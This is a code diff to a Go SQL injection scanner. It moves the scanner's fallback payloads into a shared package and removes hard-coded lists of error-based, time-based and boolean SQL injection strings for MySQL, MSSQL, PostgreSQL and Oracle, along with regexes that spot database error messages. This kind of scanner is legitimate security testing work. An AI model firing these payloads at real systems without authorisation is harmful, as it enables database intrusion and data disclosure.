@@ -324,7 +324,8 @@ func (m *SQLiScanner) getErrorPayloads() []string {
 	}
 
 	if len(values) == 0 {
-		values = defaultErrorPayloads(db)
+		payload.LogFallbackOnce("sqli")
+		values = payload.MinimalSQLiErrorPayloads(db)
 	}
 
 	if m.wafEnc.HasWAF() {
@@ -356,7 +357,8 @@ func (m *SQLiScanner) getTimePayloads() []payload.PayloadEntry {
 	}
 
 	if len(result) == 0 {
-		for _, p := range defaultTimePayloads() {
+		payload.LogFallbackOnce("sqli")
+		for _, p := range payload.MinimalSQLiTimePayloads() {
 			result = append(result, payload.PayloadEntry{Value: p.Value, Databases: []string{p.Type}})
 		}
 	}
@@ -371,7 +373,8 @@ func (m *SQLiScanner) getBooleanPairs() []payload.BooleanPair {
 			return cfg.BooleanPairs
 		}
 	}
-	return defaultBooleanPairs()
+	payload.LogFallbackOnce("sqli")
+	return payload.MinimalSQLiBooleanPairs()
 }
 
 func (m *SQLiScanner) getErrorPatterns() []*regexp.Regexp {
@@ -387,101 +390,11 @@ func (m *SQLiScanner) getErrorPatterns() []*regexp.Regexp {
 	}
 
 	if len(patterns) == 0 {
-		patterns = defaultErrorPatterns()
+		payload.LogFallbackOnce("sqli")
+		patterns = payload.CompilePatterns(payload.MinimalSQLiErrorPatterns())
 	}
 
 	return patterns
-}
-
-func defaultErrorPayloads(db string) []string {
-	base := []string{`'`, `"`, `1'"\`}
-
-	switch db {
-	case "mysql":
-		base = append(base,
-			`' OR '1'='1`, `1 UNION SELECT NULL--`,
-			`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
-			`1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--`,
-			`1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--`,
-		)
-	case "mssql":
-		base = append(base,
-			`' OR '1'='1`, `1 UNION SELECT NULL--`,
-			`1 AND 1=CONVERT(int,@@version)--`,
-		)
-	case "postgresql":
-		base = append(base,
-			`' OR '1'='1`, `1 UNION SELECT NULL--`,
-			`1';SELECT PG_SLEEP(0)--`,
-		)
-	case "oracle":
-		base = append(base,
-			`' OR '1'='1`,
-			`1' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--`,
-		)
-	default:
-		base = append(base,
-			`' OR '1'='1`, `1' AND '1'='2`, `1 UNION SELECT NULL--`,
-			`') OR ('1'='1`,
-			`1 AND 1=CONVERT(int,@@version)--`,
-			`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
-			`1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--`,
-			`1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--`,
-			`1';SELECT PG_SLEEP(0)--`,
-			`1' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--`,
-		)
-	}
-
-	return base
-}
-
-type defaultTimePayload struct {
-	Value string
-	Type  string
-}
-
-func defaultTimePayloads() []defaultTimePayload {
-	return []defaultTimePayload{
-		{Value: `' OR SLEEP(5)-- `, Type: "MySQL"},
-		{Value: `" OR SLEEP(5)-- `, Type: "MySQL"},
-		{Value: `1; WAITFOR DELAY '0:0:5'-- `, Type: "MSSQL"},
-		{Value: `'; WAITFOR DELAY '0:0:5'-- `, Type: "MSSQL"},
-		{Value: `1'; SELECT PG_SLEEP(5)-- `, Type: "PostgreSQL"},
-		{Value: `' || PG_SLEEP(5)-- `, Type: "PostgreSQL"},
-		{Value: `1' AND BENCHMARK(5000000,SHA1('test'))-- `, Type: "MySQL-benchmark"},
-	}
-}
-
-func defaultBooleanPairs() []payload.BooleanPair {
-	return []payload.BooleanPair{
-		{TruePayload: `' OR '1'='1' -- `, FalsePayload: `' OR '1'='2' -- `},
-		{TruePayload: `" OR "1"="1" -- `, FalsePayload: `" OR "1"="2" -- `},
-		{TruePayload: `1 OR 1=1`, FalsePayload: `1 OR 1=2`},
-		{TruePayload: `) OR (1=1`, FalsePayload: `) OR (1=2`},
-		{TruePayload: `' OR 1=1#`, FalsePayload: `' OR 1=2#`},
-	}
-}
-
-func defaultErrorPatterns() []*regexp.Regexp {
-	return []*regexp.Regexp{
-		regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
-		regexp.MustCompile(`(?i)Warning.*mysql_`),
-		regexp.MustCompile(`(?i)valid MySQL result`),
-		regexp.MustCompile(`(?i)MySqlClient\.`),
-		regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
-		regexp.MustCompile(`(?i)Warning.*pg_`),
-		regexp.MustCompile(`(?i)valid PostgreSQL result`),
-		regexp.MustCompile(`(?i)ORA-\d{5}`),
-		regexp.MustCompile(`(?i)Oracle error`),
-		regexp.MustCompile(`(?i)Microsoft OLE DB Provider for SQL Server`),
-		regexp.MustCompile(`(?i)\[Microsoft\]\[ODBC SQL Server Driver\]`),
-		regexp.MustCompile(`(?i)Unclosed quotation mark`),
-		regexp.MustCompile(`(?i)SQLite3::`),
-		regexp.MustCompile(`(?i)SQLite/JDBCDriver`),
-		regexp.MustCompile(`(?i)sqlite3\.OperationalError`),
-		regexp.MustCompile(`(?i)SQLSTATE\[\d+\]`),
-		regexp.MustCompile(`(?i)Syntax error.*in query expression`),
-	}
 }
 
 func levenshteinRatio(a, b string) float64 {
